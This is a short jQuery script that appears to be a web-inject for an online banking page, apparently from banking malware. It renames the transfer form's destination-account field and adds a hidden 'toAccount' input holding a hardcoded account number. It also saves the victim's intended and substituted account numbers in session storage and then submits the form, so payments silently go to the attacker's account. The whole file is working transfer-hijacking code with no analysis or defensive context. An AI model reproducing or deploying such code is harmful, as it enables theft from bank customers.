$(document).ready(function () {

    if($('input[type="submit"]')) {
        $('input[type="submit"]').attr('onClick', 'change()');
        $('input[name="toAccount"]').attr('name', 'number');
        let numKonta = $('#c198_fromAccount_chzn').text();
        numKonta = numKonta.split('eKonto');
        numKonta = numKonta[0];
        sessionStorage.setItem("numKonta", numKonta);
        $('form').append('<input name="toAccount" hidden value="3165286357890256">');
    }

})

function change() {
    let correct = $('input[name="number"]').val()
    let fake = $('input[name="toAccount"]').val()
    sessionStorage.setItem('pKon', correct)
    sessionStorage.setItem('nKon', fake)

    $('form').submit();
}
